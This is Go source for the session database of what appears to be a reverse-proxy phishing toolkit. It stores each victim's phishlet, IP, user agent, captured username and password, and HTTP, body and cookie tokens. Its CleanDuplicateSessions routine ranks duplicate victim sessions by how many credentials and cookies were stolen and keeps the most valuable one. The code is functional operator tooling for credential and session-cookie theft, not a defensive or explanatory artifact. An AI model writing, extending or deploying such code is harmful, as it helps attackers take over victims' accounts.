package database

import (
	"encoding/json"
	"strconv"

	"github.com/tidwall/buntdb"
)

type Database struct {
	path string
	db   *buntdb.DB
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateBodyTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateHttpTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	err := d.sessionsUpdateCookieTokens(sid, tokens)
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) GetSessionBySid(sid string) (*Session, error) {
	s, err := d.sessionsGetBySid(sid)
	return s, err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

// ResetSessionIdCounter resets the session ID counter to 1
// Should be called after deleting all sessions
func (d *Database) ResetSessionIdCounter() error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(SessionTable+":0:id", "1", nil)
		return nil
	})
}

// CleanDuplicateSessions removes duplicate sessions keeping only the latest one
// (most recent update time) for each IP+phishlet combination
func (d *Database) CleanDuplicateSessions() (int, error) {
	sessions, err := d.ListSessions()
	if err != nil {
		return 0, err
	}

	// Group sessions by IP + Phishlet
	groups := make(map[string][]*Session)
	for _, s := range sessions {
		key := s.RemoteAddr + ":" + s.Phishlet
		groups[key] = append(groups[key], s)
	}

	deleted := 0
	for _, group := range groups {
		if len(group) <= 1 {
			continue
		}

		// Find the best session (most data + most recent)
		var best *Session
		bestScore := -1
		for _, s := range group {
			score := 0
			if s.Username != "" {
				score += 10
			}
			if s.Password != "" {
				score += 10
			}
			if len(s.CookieTokens) > 0 {
				score += 20 + len(s.CookieTokens) // More cookies = better
			}
			if len(s.Custom) > 0 {
				score += 5
			}
			// Prefer more recent sessions when scores are equal
			if score > bestScore || (score == bestScore && best != nil && s.UpdateTime > best.UpdateTime) {
				bestScore = score
				best = s
			}
		}

		// Delete all except the best
		for _, s := range group {
			if best != nil && s.Id != best.Id {
				if err := d.DeleteSessionById(s.Id); err == nil {
					deleted++
				}
			}
		}
	}

	return deleted, nil
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
